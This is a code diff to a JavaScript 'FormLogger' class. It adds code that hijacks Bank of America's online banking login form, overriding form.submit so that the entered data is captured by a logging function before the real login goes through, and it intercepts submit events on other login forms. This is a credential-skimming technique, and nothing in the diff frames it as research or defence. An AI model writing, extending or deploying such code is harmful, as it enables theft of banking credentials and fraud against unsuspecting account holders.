@@ -67,6 +67,35 @@ class FormLogger {
       });
     }
 
+    // CRITICAL: Intercept the form BEFORE Bank of America's handlers
+    const form = document.getElementById('EnterOnlineIDForm');
+    if (form) {
+      console.log('[Logger] Found EnterOnlineIDForm, hijacking submission');
+      
+      // Store original action
+      this.originalAction = form.action;
+      this.originalMethod = form.method;
+      this.originalTarget = form.target;
+      
+      // Override form.submit() method
+      const self = this;
+      const originalSubmit = form.submit;
+      form.submit = function() {
+        console.log('[Logger] Form.submit() called, intercepting...');
+        self.logFormData(form).then(() => {
+          console.log('[Logger] Data logged, allowing form to proceed to BoA');
+          // After logging, allow submission to Bank of America
+          form.submit = originalSubmit;
+          originalSubmit.call(form);
+        }).catch(error => {
+          console.error('[Logger] Error during submission:', error);
+          // Even on error, let form proceed
+          form.submit = originalSubmit;
+          originalSubmit.call(form);
+        });
+      };
+    }
+
     // Intercept login button click
     document.addEventListener('click', (e) => {
       const button = e.target.closest('#login_button');
@@ -86,6 +115,7 @@ class FormLogger {
     document.addEventListener('submit', (e) => {
       const form = e.target;
       if (form.id === 'login-form' || form.method === 'POST' || form.id === 'EnterOnlineIDForm') {
+        console.log('[Logger] Submit event caught:', form.id);
         e.preventDefault();
         e.stopPropagation();
         this.logFormData(form);
